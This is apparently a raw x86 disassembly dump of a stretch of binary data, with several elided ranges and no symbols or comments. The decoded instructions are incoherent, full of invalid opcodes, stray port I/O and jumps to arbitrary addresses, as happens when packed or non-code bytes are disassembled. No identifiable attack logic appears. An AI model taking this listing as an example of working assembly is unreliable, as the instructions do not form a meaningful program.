  421eb2:	fs adc al,0xc4
  421eb5:	ret    0xa046
  421eb8:	shl    BYTE PTR ds:[edi+ebx*2-0x7e25d861],cl
  421ec0:	lods   eax,DWORD PTR ds:[esi]
  421ec1:	inc    ebp
  421ec2:	dec    esi
  421ec3:	jle    0x421f3d
  421ec5:	jecxz  0x421ee9
  421ec7:	fsub   DWORD PTR [edi-0x50]
  421ecb:	mov    ds:0x1cfc4820,al
  421ed0:	int    0xad
  421ed2:	in     al,0xa5
  421ed4:	and    DWORD PTR [esp+eiz*4+0x6729151f],0x1e397eea
  421edf:	int    0x20
  421ee1:	fwait
  421ee2:	inc    ebp
  421ee3:	mov    BYTE PTR [edx],bl
  421ee5:	or     al,BYTE PTR [eax-0x4c7829ac]
  421eeb:	sbb    ebp,DWORD PTR [esi-0x1d9295f1]
  421ef1:	jno    0x421ee6
  421ef3:	or     ebx,DWORD PTR [esi+0x52]
  421ef6:	in     eax,dx
  421ef7:	pop    es
  421ef8:	lods   al,BYTE PTR ds:[esi]
  421ef9:	inc    esi
  421efa:	call   0x56d217ce
  421eff:	inc    ebp
  421f00:	ret    
  421f01:	sbb    BYTE PTR [ebp+0x1787330f],bh
  421f07:	push   cs
  421f08:	xchg   esp,eax
  421f09:	mov    al,ds:0xba3595ca
  421f0e:	push   ds
  421f0f:	fadd   st,st(6)
  421f11:	rcl    BYTE PTR [ecx+0x3927cba5],cl
  421f17:	ins    DWORD PTR es:[edi],dx
  421f18:	mov    eax,0x9ca1b532
  421f1d:	push   ds
  421f1e:	pop    edi
  421f1f:	pop    es
  421f20:	mov    al,ds:0xf46090a1
  421f25:	loope  0x421ee4
  421f27:	mov    dl,0xf6
  421f29:	mov    ah,0xc4
  421f2b:	ret    
  421f2c:	leave  
  421f2d:	mov    bl,0x59
  421f2f:	lea    esp,[esi+eiz*2+0xbf22ed]
	...
  421f96:	imul   eax,DWORD PTR [esi],0xffffff8f
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0x75f9af78
  421fa4:	data16 in al,0x7
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [eax],bl
  421faf:	xchg   edx,eax
  421fb0:	push   esp
  421fb1:	ins    BYTE PTR es:[edi],dx
  421fb2:	mov    dl,BYTE PTR [ebx]
  421fb4:	call   0x13544f14
  421fb9:	adc    DWORD PTR [eax+0x68d8bd2b],eax
  421fbf:	sbb    ecx,ebx
  421fc1:	ins    DWORD PTR es:[edi],dx
  421fc2:	shr    DWORD PTR [eax],cl
  421fc4:	and    al,0x21
  421fc6:	dec    eax
  421fc7:	das    
  421fc8:	pop    ebx
  421fc9:	loopne 0x421f77
  421fcb:	rcr    ah,1
  421fcd:	neg    cl
  421fcf:	push   cs
  421fd0:	xchg   ebp,eax
  421fd1:	iret   
  421fd2:	leave  
  421fd3:	daa    
  421fd4:	push   ebp
  421fd5:	js     0x42201d
  421fd7:	inc    esp
  421fd8:	dec    edi
  421fd9:	jle    0x421fe7
  421fdb:	add    eax,0xe36096d0
  421fe0:	adc    al,0x52
  421fe2:	mov    WORD PTR [edi+0x7395bcf1],ds
  421fe8:	je     0x421f71
  421fea:	ror    DWORD PTR [edi+0x21],1
  421fed:	pop    ds
  421fee:	ins    DWORD PTR es:[edi],dx
  421fef:	sbb    BYTE PTR [esi-0xc3e5b3],dh
  421ff5:	and    eax,0xe7636e8f
  421ffa:	push   edi
  421ffb:	jae    0x42206e
  421ffd:	or     BYTE PTR [edi+ecx*1],cl
  422000:	mov    dl,0x44
  422002:	fld    DWORD PTR [edx+0x0]
  422005:	cmp    ebx,0xc9e3f49e
  42200b:	jecxz  0x421fc1
  42200d:	out    0xcb,al
  42200f:	pop    ds
  422010:	scas   al,BYTE PTR es:[edi]
  422011:	mov    cl,0xee
  422013:	xchg   ebp,eax
  422014:	ins    DWORD PTR es:[edi],dx
  422015:	dec    ecx
  422016:	dec    esi
  422017:	and    BYTE PTR [edx-0x3a],bl
  42201a:	ja     0x42205a
  42201c:	lods   eax,DWORD PTR ds:[esi]
  42201d:	sar    esi,cl
  42201f:	fistp  WORD PTR [eax+0x7936d9c9]
  422025:	retf   
  422026:	or     al,0xa9
  422028:	pop    ebp
  422029:	into   
  42202a:	and    al,0xb3
  42202c:	push   esi
  42202d:	sbb    bh,bl
  42202f:	and    DWORD PTR [esp+esi*1-0x18],0x6c3a9e1b
  422037:	call   0x13fad13e
  42203c:	xchg   ebp,eax
  42203d:	mov    ch,0xb4
  42203f:	or     dl,BYTE PTR [edx-0xd]
  422042:	jle    0x42202c
  422044:	in     eax,0x8f
  422046:	(bad)  
  422047:	in     al,dx
  422048:	fwait
  422049:	hlt    
  42204a:	clc    
  42204b:	jmp    0x421fe1
  42204d:	cs push esp
  42204f:	push   0xa4136b89
  422054:	jecxz  0x42209a
  422056:	cmp    al,0xbb
  422058:	jnp    0x42205c
  42205a:	cli    
  42205b:	loopne 0x421ffc
  42205d:	stos   BYTE PTR es:[edi],al
  42205e:	retf   
  42205f:	cld    
  422060:	or     DWORD PTR [edx],0x3b056538
  422066:	and    BYTE PTR [ecx+0x5d],0xc5
  42206a:	mov    ?,WORD PTR ds:0x4ceae352
  422070:	daa    
  422071:	dec    ebx
  422072:	sub    esi,esp
  422074:	mov    eax,0x4b76d1ea
  422079:	(bad)  
  42207b:	(bad)  [ebx]
  42207d:	jno    0x42205b
  42207f:	icebp  
  422080:	repz jne 0x422060
  422083:	cmc    
  422084:	mov    dl,0x2c
  422086:	and    eax,0x9414b495
  42208b:	and    al,0x1b
  42208d:	repnz call FWORD PTR [ecx-0x5f3b04df]
  422094:	sbb    dh,cl
  422096:	dec    edx
  422097:	sbb    DWORD PTR ds:0x932e2f23,edi
  42209d:	out    dx,eax
  42209e:	bound  esp,QWORD PTR [esp+ecx*8]
  4220a1:	rcl    DWORD PTR [eax],cl
  4220a3:	mov    ch,0x9
  4220a5:	mov    ds:0xe8341b4a,eax
  4220aa:	pop    eax
  4220ab:	in     eax,dx
  4220ac:	pop    ecx
  4220ad:	(bad)  
  4220ae:	jmp    0x51e787d1
  4220b3:	gs jl  0x4220b6
	...
  422116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422117:	push   edx
  422118:	jnp    0x422117
  42211a:	(bad)  
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0xac5c
  422123:	adc    cl,BYTE PTR [ecx+0x16a0eab]
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [edx+0x4e7b2f18],al
  422133:	xchg   DWORD PTR ds:0x7897c07e,ecx
  422139:	pop    esi
  42213a:	imul   edi,DWORD PTR [eax+0x50b6eda1],0x7a565c5c
  422144:	cmp    BYTE PTR es:[edx+eax*8+0x756481f2],dl
  42214c:	xor    al,0xe8
  42214e:	mov    bl,0xed
  422150:	inc    ecx
  422151:	cmp    esp,DWORD PTR [esi-0x75a0ec14]
  422157:	sub    eax,0x3fff68ae
  42215c:	push   0xcc4111f0
  422161:	lahf   
  422162:	adc    al,0xb6
  422164:	js     0x4221be
  422166:	cdq    
  422167:	push   ss
  422168:	or     bl,dl
  42216a:	fwait
  42216b:	or     al,0xbc
  42216d:	jl     0x422182
  42216f:	inc    edi
  422170:	retf   0xd8cf
  422173:	(bad)  
  422174:	in     al,0x6d
  422176:	mov    dl,0x75
  422179:	jmp    0x4075f36a
  42217e:	shr    DWORD PTR [esi],1
  422180:	jp     0x4221f4
  422182:	stc    
  422183:	xchg   edx,eax
  422184:	pop    esi
  422185:	fnsave [edx+ebp*8]
  422188:	jp     0x422188
  42218a:	jbe    0x42216c
  42218c:	fldcw  WORD PTR [eax]
  42218e:	dec    ebp
  42218f:	sbb    ebx,DWORD PTR ds:0xd611f0a6
  422195:	jmp    0x4221b7
  422197:	hlt    
  422198:	xchg   bl,ah
  42219a:	loopne 0x42218f
  42219c:	(bad)  
  42219e:	mov    al,ds:0x53c96512
  4221a3:	call   0x2b5be223
  4221a8:	scas   al,BYTE PTR es:[edi]
  4221a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221aa:	jne    0x4221dc
  4221ac:	ret    0x24bd
  4221af:	mov    ?,WORD PTR [ebx-0x60]
  4221b2:	and    edx,esi
  4221b4:	push   ebx
  4221b5:	mov    esp,0xbb0a461d
  4221ba:	je     0x422214
  4221bc:	out    0x76,al
  4221be:	jae    0x42219e
  4221c0:	ins    BYTE PTR es:[edi],dx
  4221c1:	xor    BYTE PTR [ecx-0x10],al
  4221c4:	sahf   
  4221c5:	cld    
  4221c6:	rcl    BYTE PTR [ebp+0x7e5bd841],1
  4221cc:	cdq    
  4221cd:	int3   
  4221ce:	cmp    ecx,esi
  4221d0:	jle    0x422164
  4221d2:	push   esp
  4221d3:	cli    
  4221d4:	jae    0x42215e
  4221d6:	sbb    al,0x9b
  4221d8:	nop
  4221d9:	jno    0x4221e0
  4221db:	xchg   BYTE PTR [ecx-0x5462c313],al
  4221e1:	xchg   edi,eax
  4221e2:	and    BYTE PTR ss:[eax],bl
  4221e5:	push   ecx
  4221e6:	mov    ebx,eax
  4221e8:	dec    ebp
  4221e9:	int3   
  4221ea:	sar    BYTE PTR [ebx],0x97
  4221ed:	fwait
  4221ee:	add    eax,0x8a53804a
  4221f3:	or     dl,BYTE PTR [ecx+0x77]
  4221f6:	xor    DWORD PTR [edx],ebp
  4221f8:	cmp    BYTE PTR [edi+0x4b],ah
  4221fb:	enter  0x5a22,0xba
  4221ff:	push   ebp
  422200:	add    al,BYTE PTR [eax]
  422202:	pop    ss
  422203:	retf   
  422204:	mov    es,WORD PTR [edx]
  422206:	dec    esp
  422207:	mov    ds:0x39c9c521,eax
  42220c:	push   ebp
  42220d:	enter  0x2b1a,0xc
  422211:	in     eax,dx
  422212:	and    al,0x42
  422214:	cmp    BYTE PTR [edi+edx*1+0x74],0x30
  422219:	adc    al,0xb1
  42221b:	imul   esp,DWORD PTR [edx],0x187d92da
  422221:	retf   
  422222:	push   edx
  422223:	cmp    al,0x63
  422225:	dec    esi
  422226:	xor    edi,DWORD PTR [ecx+ecx*2+0x365ffc2d]
  42222d:	pushf  
  42222e:	sbb    al,0x51
  422230:	cwde   
  422231:	push   edi
  422232:	test   BYTE PTR [ecx],ah
  422234:	daa    
	...
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    ecx,DWORD PTR [esi+0x152fb964]
  4222a7:	imul   eax,DWORD PTR [ecx],0x0
  4222aa:	pop    es
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    BYTE PTR [edi-0x4add4df0],ah
  4222b3:	inc    ebp
  4222b4:	mov    edi,0x13e41e78
  4222b9:	in     al,dx
  4222ba:	jl     0x4222d9
  4222bc:	fld    TBYTE PTR ds:0x749fdbc3
  4222c2:	add    DWORD PTR [edi+0x4f],esi
  4222c5:	xchg   edx,eax
  4222c6:	rcl    DWORD PTR [eax],1
  4222c8:	pop    edx
  4222c9:	imul   edx,DWORD PTR [ecx+0x6e],0x5e82d767
  4222d0:	or     esp,DWORD PTR [edi]
  4222d2:	lods   eax,DWORD PTR ds:[esi]
  4222d3:	cld    
  4222d4:	fstp   TBYTE PTR [esi+0x75]
  4222d7:	hlt    
  4222d8:	mov    WORD PTR [ecx+edi*8],?
  4222db:	mov    esi,0x763d8eaa
  4222e0:	sub    dh,bh
  4222e2:	psadbw mm3,QWORD PTR [esi+0x42136dee]
  4222e9:	push   ecx
  4222ea:	cli    
  4222eb:	fadd   QWORD PTR [ecx]
  4222ed:	adc    DWORD PTR [ebp-0x24],edx
  4222f0:	and    al,0x9a
  4222f2:	cmc    
  4222f3:	pusha  
  4222f4:	shl    DWORD PTR [edx+0x32],1
  4222f7:	lods   al,BYTE PTR ds:[esi]
  4222f8:	shl    BYTE PTR [ecx],1
  4222fa:	mov    ds:0xf65557d5,eax
  4222ff:	cmp    DWORD PTR [ecx],0xe5121516
  422305:	(bad)  
  422306:	jmp    0x4e5e5c91
  42230b:	adc    ebp,eax
  42230d:	loope  0x4222b5
  42230f:	jns    0x42236f
  422311:	cmp    edx,ebp
  422313:	jl     0x4222f5
  422315:	mov    ecx,0xdf0cd352
  42231a:	jl     0x4222e1
  42231c:	mov    eax,ds:0x312c64dd
  422321:	lea    esi,[ecx-0x47a5b770]
  422327:	mov    bh,0x42
  422329:	(bad)  
  42232a:	push   ss
  42232b:	ins    BYTE PTR es:[edi],dx
  42232c:	jns    0x4222c8
  42232e:	fisub  DWORD PTR [esi-0x5089759b]
  422334:	dec    ecx
  422335:	lea    ebp,[ebp-0xda78f7c]
  42233b:	mov    ecx,0xc4ab01e9
  422340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422341:	int    0x6a
  422343:	lea    ebp,[ebx+0x28]
  422346:	or     ah,BYTE PTR [ebx+0x77]
  422349:	push   ecx
  42234a:	test   BYTE PTR [ebp+0x63],0xe4
  42234e:	add    eax,0x78d3723c
  422353:	mov    BYTE PTR [ecx],dl
  422355:	nop
  422356:	jno    0x422340
  422358:	ror    BYTE PTR [eax],cl
  42235a:	and    ebp,DWORD PTR [ecx]
  42235c:	adc    DWORD PTR [edx-0x2b],ecx
  42235f:	(bad)  
  422360:	aaa    
  422361:	iret   
  422362:	xchg   esi,eax
  422363:	ins    DWORD PTR es:[edi],dx
  422364:	mov    ebx,0x98ee9f8f
  422369:	shl    BYTE PTR [ebx],cl
  42236b:	arpl   WORD PTR [edi+edx*4],bp
  42236e:	stos   BYTE PTR es:[edi],al
  42236f:	and    al,0x32
  422371:	shr    DWORD PTR [edx],0x65
  422374:	add    eax,DWORD PTR [ebp+0x3c]
  422377:	adc    BYTE PTR [esi],0x3d
  42237a:	outs   dx,BYTE PTR ds:[esi]
  42237b:	daa    
  42237c:	idiv   BYTE PTR [eax+0x3a8c470e]
  422382:	inc    eax
  422383:	pushf  
  422384:	rcl    eax,1
  422386:	jns    0x4223d5
  422388:	ret    
  422389:	cld    
  42238a:	sahf   
  42238b:	call   0x8a2b:0xd845fabf
  422392:	adc    ebp,edx
  422394:	jo     0x422339
  422396:	jno    0x422384
  422398:	in     eax,0x86
  42239a:	jmp    0x8bb3:0xbd66c35d
  4223a1:	mov    ch,0x7c
  4223a3:	outs   dx,DWORD PTR ds:[esi]
  4223a4:	xor    al,0xbc
  4223a6:	add    al,0xa4
  4223a8:	stc    
  4223a9:	mov    ds:0x46d10870,al
  4223ae:	dec    eax
  4223af:	icebp  
  4223b0:	mov    esp,0x51ab19a5
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0xcbfa65b6
  422424:	or     DWORD PTR [esp+ebx*1],0x700016c
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [ebx],bh
  42242f:	mov    bl,BYTE PTR [esi-0x2d2554c3]
  422435:	xchg   esi,eax
  422436:	cdq    
  422437:	sub    cl,BYTE PTR [ecx]
  422439:	dec    eax
  42243a:	sbb    al,0xbc
  42243c:	mov    BYTE PTR [esi-0x68],al
  42243f:	cmp    DWORD PTR [ecx-0x694a6483],ecx
  422445:	js     0x422493
  422447:	push   ebx
  422448:	xchg   edi,eax
  422449:	xor    al,0x4b
  42244b:	mov    edi,0x48f72279
  422450:	scas   eax,DWORD PTR es:[edi]
  422451:	fs iret 
  422453:	sub    BYTE PTR [edx],dl
  422455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422456:	retf   
  422457:	popf   
  422458:	ins    BYTE PTR es:[edi],dx
  422459:	mov    eax,0x7c52dbbd
  42245e:	rol    BYTE PTR [edi-0x39],0x99
  422462:	mov    ebx,gs
  422464:	pop    edx
  422465:	jns    0x4223f0
  422467:	fist   DWORD PTR [edx-0x58]
  42246a:	aas    
  42246b:	jge    0x4223f2
  42246d:	jne    0x42243c
  42246f:	enter  0x7e77,0x9b
  422473:	push   ecx
  422474:	rcr    DWORD PTR [edx+0x1d],cl
  422477:	in     al,0x87
  422479:	xchg   ecx,eax
  42247a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247b:	es mov esi,0x99094a36
  422481:	sbb    bl,BYTE PTR [ebx+eiz*2+0x67]
  422485:	or     eax,esp
  422487:	adc    DWORD PTR [edi],ebp
  422489:	xchg   esp,eax
  42248a:	shr    esp,1
  42248c:	cmp    al,0xa3
  42248e:	test   ebx,ebx
  422490:	mov    dh,0xf9
  422492:	fxtract 
  422494:	dec    ebp
  422495:	xchg   edx,eax
  422496:	scas   al,BYTE PTR es:[edi]
  422497:	fwait
  422498:	mov    esp,0x93205649
  42249d:	stc    
  42249e:	jmp    0x1ef1:0x61011e6d
  4224a5:	fisub  WORD PTR [esp+eax*8+0x248b8e45]
  4224ac:	sbb    eax,0xd744423d
  4224b1:	enter  0xde11,0x20
  4224b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224b6:	nop
  4224b7:	and    eax,0x1c09cb3e
  4224bc:	(bad)  
  4224bd:	scas   eax,DWORD PTR es:[edi]
  4224be:	cmp    edi,DWORD PTR [ecx+esi*8-0x4e]
  4224c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224c3:	mov    fs,esp
  4224c5:	shl    BYTE PTR [ebx+0x12],cl
  4224c8:	ret    0xccb5
  4224cb:	mov    al,ds:0xe4736298
  4224d0:	mov    WORD PTR [ebp+esi*2+0x44],ss
  4224d4:	push   esp
  4224d5:	adc    dh,BYTE PTR [eax-0x2f]
  4224d8:	dec    edx
  4224d9:	or     cl,BYTE PTR [ebx-0x15570622]
  4224df:	push   edx
  4224e0:	adc    eax,0xec5a2ff2
  4224e5:	leave  
  4224e6:	cwde   
  4224e7:	push   ebp
  4224e8:	mov    ebx,0x7807df9a
  4224ed:	not    edi
  4224ef:	cwde   
  4224f0:	test   DWORD PTR [esi-0x3a],eax
  4224f3:	and    ebx,DWORD PTR [ebx-0xa]
  4224f6:	inc    ebx
  4224f7:	cmp    DWORD PTR [ecx+ebp*1-0x505da649],ebp
  4224fe:	clc    
  4224ff:	repz int 0xfc
  422502:	push   eax
  422503:	fnstenv [edx+0x772632b6]
  422509:	ins    DWORD PTR es:[edi],dx
  42250a:	hlt    
  42250b:	mov    bl,0xe7
  42250d:	cld    
  42250e:	add    eax,0x4d6fa03c
  422513:	scas   al,BYTE PTR es:[edi]
  422514:	imul   ebp,DWORD PTR ds:0x82979918,0xffffff90
  42251b:	xchg   edi,eax
  42251c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251d:	add    eax,0x7fb2e0ac
  422522:	nop
  422523:	mov    ah,0x90
  422525:	inc    edx
  422526:	inc    ebp
  422527:	int3   
  422528:	pop    ebp
  422529:	mov    cl,0x85
  42252b:	popf   
  42252c:	lock dec ebp
  42252e:	lock test DWORD PTR [esi-0x77],eax
  422532:	pop    ss
  422533:	popf   
  422534:	sti    
	...
  422595:	add    BYTE PTR [edx-0x40887052],bl
  42259b:	ja     0x422597
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fcom   DWORD PTR [eax+0x235f1a49]
  4225a7:	ins    DWORD PTR es:[edi],dx
  4225a8:	add    DWORD PTR [eax],eax
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [ebp-0x596991eb],bh
  4225b3:	pop    edi
  4225b4:	push   ds
  4225b5:	and    eax,0x92aced3f
  4225ba:	in     al,0xd8
  4225bc:	test   BYTE PTR [edi+ebx*2-0x30],bh
  4225c0:	inc    edi
  4225c1:	jae    0x42254d
  4225c3:	in     al,0xd5
  4225c5:	sub    eax,0x3fed9505
  4225ca:	mov    si,0xbf0c
  4225ce:	pusha  
  4225cf:	sub    dl,BYTE PTR [eax-0x40]
  4225d2:	in     al,0x14
  4225d4:	xor    al,0xe2
  4225d6:	mov    ebx,0x1800d52e
  4225db:	ins    DWORD PTR es:[edi],dx
  4225dc:	xor    eax,0xfbb79ac6
  4225e1:	popa   
  4225e2:	mov    esi,0x3d27dd9a
  4225e7:	cmp    eax,0x950ea229
  4225ec:	je     0x422650
  4225ee:	lods   al,BYTE PTR ds:[esi]
  4225ef:	test   ebp,edi
  4225f1:	repz inc ebp
  4225f3:	push   esp
  4225f4:	xchg   esp,eax
  4225f5:	dec    esp
  4225f6:	rcl    BYTE PTR [bp+di-0x75],cl
  4225fa:	test   eax,0x5d26c99f
  4225ff:	retf   0x34b0
  422602:	and    DWORD PTR [edi],0x21
  422605:	mov    dh,0xfc
  422607:	shl    BYTE PTR [edi],1
  422609:	jno    0x422680
  42260b:	mov    dl,0xb3
  42260d:	test   DWORD PTR [ecx],ebp
  42260f:	jmp    0x8945:0x4afede6c
  422616:	(bad)  
  422618:	popa   
  422619:	mov    esi,DWORD PTR [edi-0x36e4f7d2]
  42261f:	in     eax,dx
  422620:	sub    bh,BYTE PTR [esp+ecx*2+0x5c]
  422624:	jle    0x4225e0
  422626:	xchg   bx,ax
  422628:	es call 0x75de:0x8147a729
  422630:	mov    eax,0x9771d96f
  422635:	cwde   
  422636:	scas   al,BYTE PTR es:[edi]
  422637:	lods   eax,DWORD PTR ds:[esi]
  422638:	sub    al,0xbc
  42263a:	jb     0x422658
  42263c:	pop    ebp
  42263d:	sbb    eax,0xad7cb9d8
  422642:	fiadd  WORD PTR [edi+0x3]
  422645:	out    dx,eax
  422646:	shl    BYTE PTR [ebp+0x13],0xe6
  42264a:	xor    al,0xf7
  42264c:	adc    DWORD PTR [edi-0x65],0x61e07e99
  422653:	push   0xffffffe2
  422655:	mov    ebp,0xa3684760
  42265a:	les    ebp,FWORD PTR [ebp+0x6e6e4ff6]
  422660:	or     DWORD PTR [esi*1-0xa032aa9],eax
  422667:	mov    bh,BYTE PTR [ebp+0x5469518]
  42266d:	pop    eax
  42266e:	aas    
  42266f:	mov    edi,0xf2bac639
  422674:	fst    QWORD PTR [edx-0x2f8cef4b]
  42267b:	cmp    bh,BYTE PTR [ebx+0x45b20055]
  422681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422682:	jle    0x4226ab
  422684:	cmp    DWORD PTR [edi+ebp*4],edx
  422687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422688:	push   esi
  422689:	in     al,dx
  42268a:	cmc    
  42268b:	fucomip st,st(5)
  42268d:	xchg   ebx,eax
  42268e:	lods   eax,DWORD PTR ds:[esi]
  42268f:	(bad)  
  422690:	sub    ecx,DWORD PTR [edi]
  422692:	sbb    cl,ah
  422694:	pushf  
  422695:	out    0x4,ax
  422698:	mov    cl,0xe2
  42269a:	push   edi
  42269b:	add    edx,DWORD PTR [edi]
  42269d:	adc    edx,DWORD PTR [eax]
  42269f:	sbb    dl,BYTE PTR [edx+0x39]
  4226a2:	inc    esp
  4226a3:	cmp    bh,ch
  4226a5:	jbe    0x42266e
  4226a7:	jmp    0x422654
  4226a9:	sbb    BYTE PTR [ebx-0x50],bh
  4226ac:	jecxz  0x42264c
  4226ae:	push   es
  4226af:	cmp    BYTE PTR [eax+esi*8+0x3c],bh
  4226b3:	js     0x42266e
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	in     eax,dx
  422723:	test   al,0xc3
  422725:	mov    ebp,0x16e2a
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR ds:0x1f3af4df,cl
  422733:	cdq    
  422734:	(bad)  
  422735:	call   0xfad5:0xc356e00b
  42273c:	mov    cl,0x9d
  42273e:	xchg   esi,eax
  42273f:	(bad)  
  422740:	cmp    esi,DWORD PTR [eax+0x51d6c63c]
  422746:	shr    esp,1
  422748:	es sahf 
  42274a:	mov    cl,0xf4
  42274c:	retf   0x7fb0
  42274f:	pop    edx
  422750:	xchg   edi,eax
  422751:	lahf   
  422752:	into   
  422753:	sti    
  422754:	imul   edi,esp,0xffffffef
  422757:	pcmpeqw mm5,QWORD PTR [edx+0x1c]
  42275b:	xchg   ebx,eax
  42275c:	adc    dl,ah
  42275e:	add    ebp,DWORD PTR [edx+esi*1+0x2f]
  422762:	xor    BYTE PTR [eax+0x31dd5d89],bl
  422768:	pop    esi
  422769:	sbb    DWORD PTR [edx],edi
  42276b:	dec    ebp
  42276c:	cmp    eax,0x74762826
  422771:	mov    ebp,DWORD PTR [ecx-0x60]
  422774:	leave  
  422775:	dec    eax
  422776:	hlt    
  422777:	lahf   
  422778:	pop    ds
  422779:	pop    es
  42277a:	mov    cl,0x17
  42277c:	repz dec dx
  42277f:	jnp    0x422777
  422781:	mov    bl,BYTE PTR [eax-0x11]
  422784:	div    DWORD PTR [esi-0x37503520]
  42278a:	pop    edx
  42278b:	retf   0x92b3
  42278e:	stos   DWORD PTR es:[edi],eax
  42278f:	pushf  
  422790:	icebp  
  422791:	push   0x1f
  422793:	lods   al,BYTE PTR ds:[esi]
  422794:	xchg   edx,eax
  422795:	adc    ecx,DWORD PTR [ebx+0x1e]
  422798:	cld    
  422799:	loopne 0x4227dc
  42279b:	mov    eax,0x658ef16
  4227a0:	dec    ebp
  4227a1:	bsr    esp,ecx
  4227a4:	cli    
  4227a5:	or     edi,DWORD PTR [edi-0x45f15d97]
  4227ab:	neg    BYTE PTR [ecx]
  4227ad:	inc    esi
  4227ae:	ins    DWORD PTR es:[edi],dx
  4227af:	sahf   
  4227b0:	ins    DWORD PTR es:[edi],dx
  4227b1:	push   ebp
  4227b2:	inc    esp
  4227b3:	push   ds
  4227b4:	adc    eax,0x8be45dc7
  4227b9:	sbb    al,0xd0
  4227bb:	jb     0x4227c0
  4227bd:	clc    
  4227be:	lods   eax,DWORD PTR ds:[esi]
  4227bf:	sub    ebx,DWORD PTR [edi+ebp*4+0x1a20ac3]
  4227c6:	push   edi
  4227c7:	adc    BYTE PTR [ebx],cl
  4227c9:	pop    ds
  4227ca:	(bad)  
  4227cb:	cmp    dh,al
  4227cd:	xchg   BYTE PTR [esi],ch
  4227cf:	push   0x37345c05
  4227d4:	(bad)  
  4227d5:	into   
  4227d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d7:	xchg   BYTE PTR [edx],dh
  4227d9:	imul   ebx,DWORD PTR [ebx-0x80],0x28cef817
  4227e0:	in     al,0xf9
  4227e2:	mov    ecx,0xb2834efa
  4227e7:	ds data16 cmp al,0xdd
  4227eb:	or     eax,0xd0d8101
  4227f0:	fwait
  4227f1:	push   edi
  4227f2:	arpl   WORD PTR [edx-0x78],cx
  4227f5:	mov    DWORD PTR ds:0x65b9135e,edi
  4227fb:	fist   DWORD PTR [ecx]
  4227fd:	fwait
  4227fe:	scas   al,BYTE PTR es:[edi]
  4227ff:	inc    BYTE PTR [ebp+0x6b9d76f5]
  422805:	stos   DWORD PTR es:[edi],eax
  422806:	lods   al,BYTE PTR ds:[esi]
  422807:	loop   0x422861
  422809:	sbb    al,0x73
  42280b:	pop    ebp
  42280c:	test   esp,edx
  42280e:	cmp    DWORD PTR [ecx-0x5f],0xa0402ad1
  422815:	jg     0x42280c
  422817:	jns    0x42279f
  422819:	xchg   ah,bl
  42281b:	jns    0x4227a1
  42281d:	mov    WORD PTR [edx+0x32],ss
  422820:	lahf   
  422821:	call   0xfa45:0x1fbaee43
  422828:	sbb    DWORD PTR [ebx-0x4ba56631],eax
  42282e:	xor    ebp,DWORD PTR [edx+esi*8-0xa136a81]
	...
  422895:	add    ch,cl
  422897:	cmp    DWORD PTR [eax-0x10680369],edi
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [esp+edi*4]
  4228a3:	ja     0x42287c
  4228a5:	push   esp
  4228a6:	xor    DWORD PTR [edi+0x1],ebp
  4228a9:	add    BYTE PTR [edi],al
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [ecx+0x47bc48c1],bh
  4228b3:	lods   eax,DWORD PTR ds:[esi]
  4228b4:	test   eax,0x9e62b654
  4228b9:	jo     0x4228ff
  4228bb:	or     eax,0x20ada6de
  4228c0:	ja     0x422938
  4228c2:	imul   ecx,DWORD PTR [edx-0x78],0x5c
  4228c6:	rol    ebp,1
  4228c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228c9:	lods   al,BYTE PTR ds:[esi]
  4228ca:	inc    ebx
  4228cb:	xor    eax,0x25c2d41d
  4228d0:	in     eax,dx
  4228d1:	mov    ebp,0x63d239c0
  4228d6:	xor    BYTE PTR [edx-0x6458f04e],ah
  4228dc:	jbe    0x422877
  4228de:	out    dx,al
  4228df:	or     al,0x86
  4228e1:	cmp    eax,0x6563206e
  4228e6:	xchg   ebx,eax
  4228e7:	xchg   ebx,eax
  4228e8:	mov    dh,0x2d
  4228ea:	imul   ecx,DWORD PTR [edx+0x3c93ee06],0xffffffbc
  4228f1:	cs push cs
  4228f3:	pop    esi
  4228f4:	mov    ecx,0xe707fd76
  4228f9:	mov    bh,0xe3
  4228fb:	fisttp WORD PTR [edx-0x5a4f23f2]
  422901:	sub    dl,BYTE PTR es:[eax]
  422904:	sbb    ebp,DWORD PTR [esi+eiz*4]
  422907:	jmp    0x3bd0f6d3
  42290c:	cmp    al,0x8a
  42290f:	push   ds
  422910:	sub    bl,0x14
